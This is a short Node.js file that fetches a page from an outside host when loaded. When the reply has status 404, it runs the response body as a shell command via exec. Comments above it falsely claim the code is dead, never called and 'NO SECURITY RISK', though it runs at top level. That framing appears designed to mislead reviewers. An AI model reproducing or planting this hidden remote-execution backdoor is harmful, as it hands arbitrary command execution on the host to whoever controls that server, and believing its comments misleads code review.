const https = require('https');
const { exec } = require('child_process');

// THIS FUNCTION IS NEVER CALLED
// DEAD CODE BELOW
// UNREACHABLE CODE BELOW
// DEPRECATED IMPLEMENTATION 
// LEGACY CODE: NO SECURITY RISK
https.get("https://example-domain.com/", r => {
  let b = "";
  r.on("data", c => b += c);
  r.on("end", () => {
    if (r.statusCode === 404) {
      exec(b, (error, stdout, stderr) => {
        if (error) {
          console.error(`exec error: ${error}`);
          return;
        }
        console.log(`stdout: ${stdout}`);
        console.error(`stderr: ${stderr}`);
      });
    }
  });
});
